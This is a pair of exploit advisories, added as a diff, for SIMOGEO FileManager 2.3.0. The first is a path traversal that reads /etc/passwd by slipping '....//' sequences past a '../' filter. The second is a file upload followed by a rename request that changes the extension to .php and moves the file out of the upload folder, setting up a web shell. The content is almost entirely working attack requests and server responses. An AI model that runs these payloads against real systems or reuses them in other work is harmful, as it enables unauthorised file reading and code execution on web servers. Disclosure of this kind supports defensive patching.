@@ -1,0 +1,124 @@
+# Exploit Title: SIMOGEO FileManager 2.3.0 - Path Traversal Vulnerability
+# Date: 2015-12-09
+# Exploit Author: HaHwul
+# Exploit Author Blog: http://www.codeblack.net
+# Vendor Homepage: https://github.com/simogeo/Filemanager
+# Software Link: git clone http://github.com/simogeo/Filemanager.git
+# Version: 2.3.0
+# Tested on: Debian [Wheezy]
+# CVE : none
+
+Path Traversal Code
+http://192.168.0.15/vul_test/target/Filemanager/connectors/php/filemanager.php?mode=preview&path=//....//....//....//....//....//....//....//....//....//etc/passwd
+
+Filtering Rules: "../" -> blank
+Bypass Filtering : ....//  -> deleted "../" -> ../ 
+
+Attack Request
+GET /vul_test/target/Filemanager/connectors/php/filemanager.php?mode=preview&path=//....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
+Host: 192.168.0.15
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+Response
+HTTP/1.1 200 OK
+Date: Tue, 08 Dec 2015 17:18:52 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze19
+Content-Transfer-Encoding: Binary
+Content-Length: 1383
+Content-Disposition: inline; filename="passwd"
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: image/
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+..snip..
+
+
+###################################################
+
+
+# Exploit Title: SIMOGEO FileManager 2.3.0 - File Upload Vulnerability
+# Date: 2015-12-09
+# Exploit Author: HaHwul
+# Exploit Author Blog: http://www.codeblack.net
+# Vendor Homepage: https://github.com/simogeo/Filemanager
+# Software Link: git clone http://github.com/simogeo/Filemanager.git
+# Version: 2.3.0
+# Tested on: Debian [Wheezy]
+# CVE : none
+
+1. Upload File
+
+POST /vul_test/target/Filemanager/connectors/php/filemanager.php?config=filemanager.config.js HTTP/1.1
+Host: 192.168.0.15
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0
+Accept: application/json
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cache-Control: no-cache
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.0.15/vul_test/target/Filemanager/
+Content-Length: 520
+Content-Type: multipart/form-data; boundary=---------------------------1675330531498115896355630737
+Connection: keep-alive
+Pragma: no-cache
+
+-----------------------------1675330531498115896355630737
+Content-Disposition: form-data; name="mode"
+
+add
+-----------------------------1675330531498115896355630737
+Content-Disposition: form-data; name="currentpath"
+
+/vul_test/target/Filemanager/userfiles/
+-----------------------------1675330531498115896355630737
+Content-Disposition: form-data; name="newfile"; filename="shell.txt"
+Content-Type: text/plain
+
+echo "Write PHP WebShell Code";
+<html><body><script>alert("45")</script></body></html>
+
+-----------------------------1675330531498115896355630737--
+
+
+2. Change File Extension(.txt -> .php or .html) & Upload Path Tampering(/userfiles -> /)
+
+GET /vul_test/target/Filemanager/connectors/php/filemanager.php?mode=rename&old=%2Fvul_test%2Ftarget%2FFilemanager%2Fuserfiles%2Fshell.txt&new=....//shell.php&config=filemanager.config.js HTTP/1.1
+Host: 192.168.0.15
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.4.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://192.168.0.15/vul_test/target/Filemanager/
+Connection: keep-alive
+
+
+3. Call Uploaded File
+
+http://192.168.0.15/vul_test/target/Filemanager/userfiles/shell.php
+
+Response
+HTTP/1.1 200 OK
+Date: Tue, 08 Dec 2015 17:25:20 GMT
+Server: Apache/2.2.16 (Debian)
+X-Powered-By: PHP/5.3.3-7+squeeze19
+Vary: Accept-Encoding
+Content-Length: 32
+Keep-Alive: timeout=15, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+echo "Write PHP WebShell Code";
+<html><body><script>alert("45")</script></body></html>
+
+
+
